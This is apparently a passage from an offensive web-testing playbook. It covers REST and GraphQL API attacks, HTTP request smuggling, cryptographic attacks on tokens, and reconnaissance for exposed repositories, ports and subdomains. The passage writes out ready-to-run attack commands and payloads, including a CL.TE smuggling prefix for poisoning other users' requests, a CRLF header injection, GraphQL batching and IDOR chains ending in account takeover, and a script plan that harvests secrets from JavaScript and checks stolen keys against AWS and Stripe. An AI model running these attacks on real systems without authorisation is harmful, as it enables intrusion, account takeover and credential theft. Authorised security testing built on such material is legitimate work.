## API-Specific Vulnerabilities

### REST API

- `->` **[Primary Probe]** Run `kiterunner scan https://target/api -w routes-large.kite --max-connection-timeout 3` to bruteforce undocumented endpoints [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Signal: Undocumented 200/201 endpoints]** → Fuzz with Arjun: `arjun -u https://target/api/internal/admin -m POST` to discover hidden params
  - `->` **[Dead End: All endpoints 401]** → Test unauthenticated verb tampering: `HEAD`/`OPTIONS` may bypass auth middleware; `TRACE` method may reflect headers
  - `->` **[Dead End: Strict verb enforcement]** → HTTP parameter pollution: `?user_id=attacker&user_id=victim` — which value does backend consume?

### GraphQL

- `->` **[Primary Probe]** Test introspection: `{"query":"{__schema{types{name,fields{name}}}}"}` [zeropath](https://zeropath.com/blog/cve-2025-10004-gitlab-graphql-dos-summary)
  - `->` **[Signal: Schema returned]** → Map all queries/mutations; identify sensitive operations (deleteUser, updateRole, readPrivateMessage); test with manipulated auth context
  - `->` **[Dead End: Introspection disabled]** → Field suggestion attack: intentionally misspell fields (`usr` → server suggests `user`); enumerate schema by suggestions
  - `->` **[Dead End: No suggestions]** → Wordlist-based field fuzzing: `ffuf -u https://target/graphql -X POST -d '{"query":"{FUZZ}"}' -w graphql-fields.txt`
  - `->` **[Dead End: All queries blocked]** → Batching abuse: `[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]` — may bypass per-request rate limiting
  - `->` **[Data Chaining]** GraphQL IDOR on private messages → extract admin email → use in password reset CSRF → account takeover

### HTTP Request Smuggling

- `->` **[Primary Probe]** Run `smuggler.py -u https://target/ -l` to detect CL.TE and TE.CL desync vulnerabilities [sentinelone](https://www.sentinelone.com/vulnerability-database/cve-2025-22871/)
  - `->` **[Signal: CL.TE confirmed]** → Craft prefix to poison next victim's request:
    ```
    POST / HTTP/1.1
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    ```
  - `->` **[Dead End: Standard smuggling blocked]** → Test H2.CL / H2.TE (HTTP/2 downgrade smuggling) using `h2csmuggler`: HTTP/2 front-end + HTTP/1.1 back-end with conflicting Content-Length
  - `->` **[Dead End: HTTP/2 not supported]** → Header injection via CRLF in HTTP/1.1 path: `GET /%0d%0aX-Forwarded-For:%20127.0.0.1 HTTP/1.1`
  - `->` **[Data Chaining]** Smuggling prefix to internal admin interface → bypass IP allowlist → trigger admin-only SSRF or file-read endpoint [sentinelone](https://www.sentinelone.com/vulnerability-database/cve-2025-22871/)

***

## Cryptographic Weaknesses

- `->` **[Primary Probe]** Inspect all tokens, cookies, and encrypted values for static IV, ECB mode patterns, or predictable structure; check if same plaintext always produces same ciphertext (ECB indicator) [ijircst](https://www.ijircst.org/view_abstract.php?title=Design-and-Implementation-of-an-Enhanced-Web-Application-Vulnerability-Scanner&year=2025&vol=13&primary=QVJULTEzNjI=)
  - `->` **[Signal: ECB mode]** → Byte-at-a-time decryption: craft inputs to leak one byte per request; or block rearrangement for role escalation in encrypted cookies
  - `->` **[Dead End: CBC mode]** → CBC bit-flipping: flip bits in ciphertext to modify specific plaintext fields (e.g., `user=attacker` → `user=admin\x00\x00\x00`)
  - `->` **[Dead End: Authenticated encryption (GCM)]** → Test nonce reuse: collect multiple ciphertexts, XOR nonce-reused ciphertexts to recover keystream
  - `->` **[Dead End: Proper AEAD]** → Padding oracle attack via side-channel: measure response time or error message differences for CBC-encrypted tokens (`PKCS7` padding)
  - `->` **[Condition: Weak PRNG for token generation]** → Collect 50+ tokens, run through `php_mt_seed` or custom predictor to derive seed and forecast future tokens

**One-liner — Detect Repeated Ciphertext Blocks (ECB Oracle):**
```bash
python3 -c "import sys,base64; c=base64.b64decode(sys.argv [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)); blks=[c[i:i+16] for i in range(0,len(c),16)]; print('ECB DETECTED' if len(blks)!=len(set(blks)) else 'Likely CBC')" "<cookie_value>"
```

***

## Misconfiguration & Information Disclosure

- `->` **[Primary Probe]** Run `nuclei -u https://target -t exposures/ -t misconfiguration/ -t technologies/ -severity medium,high,critical -o /vulns/target/reports/nuclei.txt` [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11415292/)
  - `->` **[Signal: `.git` exposed]** → `git-dumper https://target/.git/ ./dumped-repo` → reconstruct source → find hardcoded creds, internal endpoints, business logic
  - `->` **[Signal: Swagger/OpenAPI exposed]** → Import into Postman → enumerate all API routes → fuzz undocumented params with Arjun
  - `->` **[Dead End: Common paths return 404]** → JS recon pipeline:
    ```bash
    gau https://target | grep "\.js$" | httpx -mc 200 | tee js-files.txt
    cat js-files.txt | xargs -I{} sh -c 'curl -sk "{}" | grep -Eo "(api|/v[0-9]+|/internal|secret|token|key)[^\"]*"'
    ```
  - `->` **[Dead End: JS minified / no leaks]** → Check error handling: send malformed requests (invalid JSON, wrong content-type, oversized headers) to trigger stack traces leaking framework version, internal paths, DB connection strings
  - `->` **[Dead End: Generic error pages]** → Infrastructure recon: `nmap -sV -p 80,443,8080,8443,9200,6379,5432,27017 <target-IP>` → identify default service pages, exposed admin panels (Kibana `:5601`, Redis `:6379` unauthenticated)
  - `->` **[Dead End: All ports filtered]** → Subdomain takeover check: `subfinder -d target.com | httpx -mc 404 | nuclei -t takeovers/` — dangling CNAMEs pointing to deprovisioned cloud services (S3, GitHub Pages, Heroku)

**Script Definition Block — Secrets Harvesting from JS:**
- **Input:** List of JS URLs from `gau`/`waybackurls`
- **Core Logic:**
  1. Fetch each JS file with rotating User-Agent
  2. Apply regex patterns: API keys (`[a-zA-Z0-9]{32,45}`), JWTs (`eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`), AWS keys (`AKIA[A-Z0-9]{16}`), private keys (`-----BEGIN RSA`)
  3. Deduplicate and classify by pattern type
  4. Validate discovered API keys against their respective services (AWS STS, Stripe `/v1/charges`, etc.)
- **Dependencies:** Python `re`, `requests`, `httpx`, `trufflehog` (secondary validation)
- **Expected Output:** `secrets.csv` with columns: `source_url`, `secret_type`, `value`, `validity_status`

***

